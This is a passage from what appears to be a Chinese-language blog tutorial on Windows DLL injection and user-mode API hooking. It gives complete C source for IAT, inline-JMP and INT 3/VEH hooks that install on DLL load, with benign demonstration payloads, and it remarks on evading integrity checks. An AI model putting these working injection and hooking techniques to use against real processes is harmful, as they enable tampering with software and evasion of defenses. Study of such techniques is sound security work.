class="string">f&quot;[+] Compile command: gcc -shared my_hack.c <span class="subst">&#123;def_file&#125;</span> -o <span class="subst">&#123;target_dll&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>使用 <code>gcc -shared -o payload.dll payload.c payload.def</code>进行编译</p><p><img src="/image/2025-12-12-windows_dll_injection/1765845870344.png" alt="1765845870344"></p><h3 id="攻击效果-3"><a href="#攻击效果-3" class="headerlink" title="攻击效果"></a>攻击效果</h3><p><img src="/image/2025-12-12-windows_dll_injection/1765691259175.png" alt="1765691259175"></p><p><img src="/image/2025-12-12-windows_dll_injection/1765691304640.png" alt="1765691304640"></p><h2 id="windows-hook-R3"><a href="#windows-hook-R3" class="headerlink" title="windows hook-R3"></a>windows hook-R3</h2><p>Hook（钩子）技术的核心在于截获软件执行流或消息流，在目标函数执行前、执行中或执行后插入自定义逻辑。根据介入层级和实现方式的不同，可以分为应用层 Hook（Ring 3）、调试型 Hook 、底层虚拟化 Hook（Ring -1）以及内核Hook（Ring 0）。</p><p><img src="/image/2025-12-12-windows_dll_injection/1765691353434.png" alt="1765691353434"></p><h3 id="基于导入表的-Hook-IAT-Hook"><a href="#基于导入表的-Hook-IAT-Hook" class="headerlink" title="基于导入表的 Hook (IAT Hook)"></a>基于导入表的 Hook (IAT Hook)</h3><p>IAT Hook 通过修改 IAT 表中目标函数的地址，将其替换为恶意 Hook 函数的地址。当程序下次“查表”调用该函数时，就会跳转到恶意代码。</p><h4 id="实现方法-2"><a href="#实现方法-2" class="headerlink" title="实现方法"></a>实现方法</h4><p><strong>定位导入表</strong> ：从 DOS 头 -&gt; NT 头 -&gt; 可选头 -&gt; 数据目录中找到  <strong>导入表 (Import Directory)</strong> 。</p><p><strong>定位目标 DLL</strong> ：遍历导入描述符 (<code>IMAGE_IMPORT_DESCRIPTOR</code>)，找到目标 DLL（如 <code>user32.dll</code>）</p><p><strong>双桥遍历</strong> ：同时遍历 <strong>OriginalFirstThunk (INT)</strong> 和  <strong>FirstThunk (IAT)</strong> 。</p><ul><li><code>OriginalFirstThunk</code> 保存函数 <strong>名称</strong> ，永远不会改变，用于匹配目标函数名（如 “DispatchMessageW”）。</li><li><code>FirstThunk</code> 保存函数 <strong>地址</strong> ，用于实施修改。</li></ul><p><img src="/image/2025-12-12-windows_dll_injection/1765846796434.png" alt="1765846796434"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译命令: gcc -shared -o IATHook_DualBridge.dll IATHook_DualBridge.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 MessageBoxW 函数指针类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LRESULT</span> <span class="params">(WINAPI *PDispatchMessageW)</span><span class="params">(CONST MSG *lpMsg)</span>;</span><br><span class="line">PDispatchMessageW pOriginalDispatchMessageW = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">LRESULT WINAPI <span class="title function_">MyDispatchMessageW</span><span class="params">(CONST MSG *lpMsg)</span> &#123;</span><br><span class="line">    <span class="comment">// 检查是否是字符消息 (WM_CHAR = 0x0102)</span></span><br><span class="line">    <span class="keyword">if</span> (lpMsg-&gt;message == WM_CHAR) &#123;</span><br><span class="line">        <span class="type">wchar_t</span> ch = (<span class="type">wchar_t</span>)lpMsg-&gt;wParam; <span class="comment">// wParam 存放的就是字符的 ASCII/Unicode 码</span></span><br><span class="line">        <span class="keyword">if</span>(((MSG*)lpMsg)-&gt;wParam==<span class="string">&#x27;a&#x27;</span>)((MSG*)lpMsg)-&gt;wParam = <span class="string">&#x27;b&#x27;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 继续调用原函数，让 Notepad 正常处理</span></span><br><span class="line">    <span class="keyword">return</span> pOriginalDispatchMessageW(lpMsg);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">StartIATHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 获取当前模块基址 (注入后即为 Notepad.exe 的基址)</span></span><br><span class="line">    HMODULE hModule = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">// 2. 获取 DOS 头和 NT 头</span></span><br><span class="line">    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;</span><br><span class="line">    PIMAGE_NT_HEADERS pNtHeader = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader-&gt;e_lfanew);</span><br><span class="line">    <span class="comment">// 3. 获取导入表目录</span></span><br><span class="line">    PIMAGE_IMPORT_DESCRIPTOR pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((BYTE*)hModule + </span><br><span class="line">        pNtHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">    <span class="comment">// 4. 遍历导入表寻找 user32.dll</span></span><br><span class="line">    <span class="keyword">while</span> (pImportDesc-&gt;Name) &#123;</span><br><span class="line">        <span class="type">char</span>* pszDllName = (<span class="type">char</span>*)((BYTE*)hModule + pImportDesc-&gt;Name);</span><br><span class="line">        <span class="keyword">if</span> (_stricmp(pszDllName, <span class="string">&quot;user32.dll&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="comment">// 桥1: OriginalFirstThunk (INT) - 用于查找函数名 [cite: 22]</span></span><br><span class="line">            PIMAGE_THUNK_DATA pOriginalThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc-&gt;OriginalFirstThunk);</span><br><span class="line">            <span class="comment">// 桥2: FirstThunk (IAT) - 用于修改函数地址 [cite: 23]</span></span><br><span class="line">            PIMAGE_THUNK_DATA pFirstThunk = (PIMAGE_THUNK_DATA)((BYTE*)hModule + pImportDesc-&gt;FirstThunk);</span><br><span class="line">            <span class="comment">// 同时遍历两个数组，索引是同步的</span></span><br><span class="line">            <span class="keyword">while</span> (pOriginalThunk-&gt;u1.AddressOfData) &#123;</span><br><span class="line">                <span class="comment">// 检查是否通过名称导入 (最高位不是1)</span></span><br><span class="line">                <span class="comment">// IMAGE_ORDINAL_FLAG 在64位下是高位判断，防止读取序号出错</span></span><br><span class="line">                <span class="keyword">if</span> (!(pOriginalThunk-&gt;u1.Ordinal &amp; IMAGE_ORDINAL_FLAG)) &#123;</span><br><span class="line">                    <span class="comment">// 通过 OriginalThunk 获取函数名结构</span></span><br><span class="line">                    PIMAGE_IMPORT_BY_NAME pImportByName = (PIMAGE_IMPORT_BY_NAME)((BYTE*)hModule + pOriginalThunk-&gt;u1.AddressOfData);</span><br><span class="line">                    <span class="comment">// 比对函数名</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(pImportByName-&gt;Name, <span class="string">&quot;DispatchMessageW&quot;</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// 1. 保存旧地址 (从 FirstThunk 里读)</span></span><br><span class="line">                        pOriginalDispatchMessageW = (PDispatchMessageW)pFirstThunk-&gt;u1.Function;</span><br><span class="line">                        <span class="comment">// 2. 修改内存保护属性</span></span><br><span class="line">                        DWORD dwOldProtect;</span><br><span class="line">                        VirtualProtect(&amp;pFirstThunk-&gt;u1.Function, <span class="keyword">sizeof</span>(LPVOID), PAGE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">                        <span class="comment">// 3. 修改 IAT，指向我们的函数 [cite: 27]</span></span><br><span class="line">                        <span class="comment">// 注意：这里修改的是 FirstThunk，不是 OriginalThunk</span></span><br><span class="line">                        pFirstThunk-&gt;u1.Function = (ULONG_PTR)MyDispatchMessageW;</span><br><span class="line">                        <span class="comment">// 4. 恢复保护</span></span><br><span class="line">                        VirtualProtect(&amp;pFirstThunk-&gt;u1.Function, <span class="keyword">sizeof</span>(LPVOID), dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                pOriginalThunk++;</span><br><span class="line">                pFirstThunk++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        pImportDesc++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// DLL 入口点</span></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (fdwReason) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        StartIATHook();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击效果-4"><a href="#攻击效果-4" class="headerlink" title="攻击效果"></a>攻击效果</h4><p>所有输入的 <code>a</code>都变成了 <code>b</code></p><p><img src="/image/2025-12-12-windows_dll_injection/1765703026493.png" alt="1765703026493"></p><h3 id="基于代码的内联-Hook-Inline-Hook"><a href="#基于代码的内联-Hook-Inline-Hook" class="headerlink" title="基于代码的内联 Hook (Inline Hook)"></a>基于代码的内联 Hook (Inline Hook)</h3><p>Inline Hook 的本质是“劫持”函数入口。<br>它不依赖 PE 结构，而是直接修改目标函数在内存中的 <strong>机器码</strong> 。通常是在函数开头写入一条<strong>JMP</strong>指令。当 CPU 执行到该函数时，立即被强制跳转到 Hook 函数。</p><h4 id="实现方法-3"><a href="#实现方法-3" class="headerlink" title="实现方法"></a>实现方法</h4><p><code>GetProcAddress</code> ：直接获取目标函数的内存地址，无需解析 PE。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 编译命令: gcc -shared -o InlineHookDll.dll InlineHookDll.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义 DispatchMessageW 函数指针类型</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LRESULT</span> <span class="params">(WINAPI *PDispatchMessageW)</span><span class="params">(CONST MSG *lpMsg)</span>;</span><br><span class="line"></span><br><span class="line">PDispatchMessageW g_pOriginalDispatchMessageW = <span class="literal">NULL</span>;</span><br><span class="line">BYTE g_OriginalBytes[<span class="number">14</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">// 用于保存函数原本的前14个字节</span></span><br><span class="line">BYTE g_PatchBytes[<span class="number">14</span>] = &#123; <span class="number">0</span> &#125;;    <span class="comment">// 用于保存我们要写入的 JMP 指令</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">LRESULT WINAPI <span class="title function_">MyDispatchMessageW</span><span class="params">(CONST MSG *lpMsg)</span> &#123;</span><br><span class="line">  </span><br><span class="line">    <span class="comment">// [关键步骤 A] 暂时脱钩 (恢复原始代码)</span></span><br><span class="line">    <span class="comment">// 为什么要恢复？因为我们等下要调用原函数。如果不恢复，</span></span><br><span class="line">    <span class="comment">// 调用原函数时又会遇到 JMP 指令跳回这里，导致死循环 (Stack Overflow)。</span></span><br><span class="line">    UninstallHook();</span><br><span class="line">    <span class="keyword">if</span> (lpMsg-&gt;message == WM_CHAR) &#123;</span><br><span class="line">        <span class="keyword">if</span> (lpMsg-&gt;wParam == <span class="string">&#x27;a&#x27;</span>) &#123;</span><br><span class="line">            ((MSG*)lpMsg)-&gt;wParam = <span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [关键步骤 C] 调用原函数 (此时原函数已恢复正常)</span></span><br><span class="line">    LRESULT result = g_pOriginalDispatchMessageW(lpMsg);</span><br><span class="line">    <span class="comment">// [关键步骤 D] 重新挂钩</span></span><br><span class="line">    <span class="comment">// 原函数执行完了，赶紧把钩子挂回去，拦截下一次消息</span></span><br><span class="line">    InstallHook();</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_pOriginalDispatchMessageW == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    <span class="comment">// 修改内存权限为可读可写可执行 (User32的代码段通常是只读的) [cite: 32]</span></span><br><span class="line">    VirtualProtect(g_pOriginalDispatchMessageW, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    <span class="comment">// 写入我们要构造好的 JMP 指令</span></span><br><span class="line">    <span class="comment">// 效果：只要 CPU 执行到 DispatchMessageW 开头，就直接跳到 MyDispatchMessageW</span></span><br><span class="line">    <span class="built_in">memcpy</span>(g_pOriginalDispatchMessageW, g_PatchBytes, <span class="number">14</span>);</span><br><span class="line">    <span class="comment">// 恢复内存权限</span></span><br><span class="line">    VirtualProtect(g_pOriginalDispatchMessageW, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">UninstallHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (g_pOriginalDispatchMessageW == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line">    DWORD dwOldProtect;</span><br><span class="line">    VirtualProtect(g_pOriginalDispatchMessageW, <span class="number">14</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);</span><br><span class="line">    <span class="comment">// 把备份的最原始的字节写回去</span></span><br><span class="line">    <span class="built_in">memcpy</span>(g_pOriginalDispatchMessageW, g_OriginalBytes, <span class="number">14</span>);</span><br><span class="line">    VirtualProtect(g_pOriginalDispatchMessageW, <span class="number">14</span>, dwOldProtect, &amp;dwOldProtect);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InitHook</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 获取 DispatchMessageW 的真实地址</span></span><br><span class="line">    HMODULE hUser32 = GetModuleHandleW(<span class="string">L&quot;user32.dll&quot;</span>);</span><br><span class="line">    g_pOriginalDispatchMessageW = (PDispatchMessageW)GetProcAddress(hUser32, <span class="string">&quot;DispatchMessageW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!g_pOriginalDispatchMessageW) <span class="keyword">return</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>(g_OriginalBytes, g_pOriginalDispatchMessageW, <span class="number">14</span>);</span><br><span class="line">    <span class="comment">// 2. 构造 64位 的绝对跳转指令 (JMP [RIP+0])</span></span><br><span class="line">    <span class="comment">// 指令机器码: FF 25 00 00 00 00 (6字节) + 8字节的目标地址</span></span><br><span class="line">    <span class="comment">// 0xFF 0x25 是 JMP [RIP+offset]</span></span><br><span class="line">    g_PatchBytes[<span class="number">0</span>] = <span class="number">0xFF</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">1</span>] = <span class="number">0x25</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">2</span>] = <span class="number">0x00</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">3</span>] = <span class="number">0x00</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">4</span>] = <span class="number">0x00</span>;</span><br><span class="line">    g_PatchBytes[<span class="number">5</span>] = <span class="number">0x00</span>;</span><br><span class="line">    <span class="comment">// 接下来的 8 个字节填入我们的函数 MyDispatchMessageW 的内存地址</span></span><br><span class="line">    *(ULONG_PTR*)(&amp;g_PatchBytes[<span class="number">6</span>]) = (ULONG_PTR)MyDispatchMessageW;</span><br><span class="line">    <span class="comment">// 3. 正式挂钩</span></span><br><span class="line">    InstallHook();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">switch</span> (fdwReason) &#123;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">        InitHook(); </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line">        UninstallHook(); </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="热补丁-Hook-HotFix-Hook"><a href="#热补丁-Hook-HotFix-Hook" class="headerlink" title="热补丁 Hook (HotFix Hook)"></a>热补丁 Hook (HotFix Hook)</h3><p>它利用了 Windows API（主要在 32 位下）特有的函数头结构：</p><ol><li>函数开头是 2 字节的无用指令 <code>MOV EDI, EDI</code>。</li><li>函数上方有 5 字节的空白区 (<code>NOP</code> 或 <code>INT 3</code>)。<br>原理是将开头的 2 字节改为“短跳转（跳到上方）”，在上方写入“长跳转（跳到 Hook 函数）”。</li></ol><p>本质和Inline Hook都是更改函数入口处的机器码</p><h3 id="软件断点-Hook-Int-3-Hook"><a href="#软件断点-Hook-Int-3-Hook" class="headerlink" title="软件断点 Hook (Int 3 Hook)"></a>软件断点 Hook (Int 3 Hook)</h3><p>Int 3 Hook 利用 CPU 的异常处理机制。<br>它将目标函数的第一字节替换为 <code>0xCC</code> (汇编指令  <strong>INT 3</strong> )。当 CPU 执行到这里时，会暂停并抛出 <strong><code>EXCEPTION_BREAKPOINT</code></strong> 异常。通过注册异常处理程序（VEH），可以捕获这个异常并执行自定义逻辑。</p><p>中断hook都得关闭kernel debug：<code>bcdedit /debug off</code></p><h4 id="实现方法-4"><a href="#实现方法-4" class="headerlink" title="实现方法"></a>实现方法</h4><p><strong><code>AddVectoredExceptionHandler (VEH)</code></strong> ：注册一个全局异常处理函数，用来捕获 <code>0xCC</code> 触发的异常。相比 SEH，VEH 优先级更高且作用于全进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 目标函数指针</span></span><br><span class="line"><span class="type">void</span>* g_pTargetFunc = <span class="literal">NULL</span>;</span><br><span class="line"><span class="comment">// 保存原始字节</span></span><br><span class="line">BYTE g_OriginalByte = <span class="number">0</span>;</span><br><span class="line"><span class="comment">// 标记是否已经 Hook</span></span><br><span class="line">BOOL g_bIsHooked = FALSE;</span><br><span class="line"><span class="comment">// 我们的处理逻辑</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">MyHookHandler</span><span class="params">()</span> &#123;</span><br><span class="line">    MessageBoxA(<span class="literal">NULL</span>, <span class="string">&quot;INT 3 Hook Triggered via VEH!&quot;</span>, <span class="string">&quot;Hacked&quot;</span>, MB_OK);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// VEH 异常处理函数</span></span><br><span class="line">LONG WINAPI <span class="title function_">MyVEHHandler</span><span class="params">(PEXCEPTION_POINTERS pExceptionInfo)</span> &#123;</span><br><span class="line">    <span class="comment">// 1. 判断是否是断点异常 (0x80000003) 且地址是我们 Hook 的地址</span></span><br><span class="line">    <span class="keyword">if</span> (pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionCode == EXCEPTION_BREAKPOINT &amp;&amp;</span><br><span class="line">        pExceptionInfo-&gt;ExceptionRecord-&gt;ExceptionAddress == g_pTargetFunc) &#123;</span><br><span class="line">        <span class="comment">// 2. 执行我们的恶意逻辑</span></span><br><span class="line">        MyHookHandler();</span><br><span class="line">        <span class="comment">// 3 恢复原始字节 (去掉 0xCC)</span></span><br><span class="line">        DWORD dwOld;</span><br><span class="line">        VirtualProtect(g_pTargetFunc, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;dwOld);</span><br><span class="line">        <span class="built_in">memcpy</span>(g_pTargetFunc, &amp;g_OriginalByte, <span class="number">1</span>);</span><br><span class="line">        VirtualProtect(g_pTargetFunc, <span class="number">1</span>, dwOld, &amp;dwOld);  </span><br><span class="line">        <span class="comment">// 4.将EIP/RIP 指针倒退 1 个字节</span></span><br><span class="line">        <span class="comment">// 因为 CPU 执行了 INT 3 后，指令指针已经指向了下一个字节，我们需要退回去重新执行原指令</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">        pExceptionInfo-&gt;ContextRecord-&gt;Rip--;</span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line">        pExceptionInfo-&gt;ContextRecord-&gt;Eip--;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span>   </span></span><br><span class="line">        <span class="comment">// 注意：这种简单的 Hook 是一次性的。</span></span><br><span class="line">        <span class="comment">// 如果想持续 Hook，需要在这里设置单步调试 (EFLAGS -&gt; TF位)，</span></span><br><span class="line">        <span class="comment">// 在单步异常中再次写入 0xCC。为简化代码，这里只演示触发一次。</span></span><br><span class="line">        <span class="keyword">return</span> EXCEPTION_CONTINUE_EXECUTION;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> EXCEPTION_CONTINUE_SEARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">InstallInt3Hook</span><span class="params">()</span> &#123;</span><br><span class="line">    HMODULE hUser32 = GetModuleHandleA(<span class="string">&quot;user32.dll&quot;</span>);</span><br><span class="line">    g_pTargetFunc = (<span class="type">void</span>*)GetProcAddress(hUser32, <span class="string">&quot;MessageBoxW&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!g_pTargetFunc) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 1. 注册全局向量化异常处理程序 (VEH)</span></span><br><span class="line">    <span class="comment">// 参数 1 表示添加到链表头部，优先处理</span></span><br><span class="line">    AddVectoredExceptionHandler(<span class="number">1</span>, MyVEHHandler);</span><br><span class="line">    <span class="comment">// 2. 备份原字节</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;g_OriginalByte, g_pTargetFunc, <span class="number">1</span>);</span><br><span class="line">    <span class="comment">// 3. 写入 0xCC (INT 3)</span></span><br><span class="line">    DWORD dwOld;</span><br><span class="line">    VirtualProtect(g_pTargetFunc, <span class="number">1</span>, PAGE_EXECUTE_READWRITE, &amp;dwOld);</span><br><span class="line">    *(BYTE*)g_pTargetFunc = <span class="number">0xCC</span>;</span><br><span class="line">    VirtualProtect(g_pTargetFunc, <span class="number">1</span>, dwOld, &amp;dwOld);</span><br><span class="line">    g_bIsHooked = TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI <span class="title function_">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (fdwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        InstallInt3Hook();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="攻击效果-5"><a href="#攻击效果-5" class="headerlink" title="攻击效果"></a>攻击效果</h4><p><img src="/image/2025-12-12-windows_dll_injection/1765856499390.png" alt="1765856499390"></p><h3 id="硬件断点-Hook-Hardware-Hook"><a href="#硬件断点-Hook-Hardware-Hook" class="headerlink" title="硬件断点 Hook (Hardware Hook)"></a>硬件断点 Hook (Hardware Hook)</h3><p>利用 CPU 自带的  <strong>调试寄存器 (Dr0 - Dr7)</strong> 。</p><p>一个CPU一般有8个调试寄存器（DR0 ~ DR7 寄存器），用于管理硬件断点</p><ul><li>DR0 ~DR3： 存储硬件断点地址。</li><li>DR4 和 DR5： 保留。</li><li>DR6：调试状态寄存器，用于向调试器报告事件的详细信息，以供调试器判断发生的是何种事件。</li><li>DR7：调试控制寄存器，用于定义断点的中断条件。</li></ul><p>这是一种 <strong>无损 Hook</strong> ，不需要修改内存中的任何代码或数据，因此能完美绕过内存完整性校验（CRC）。设置断点后，CPU 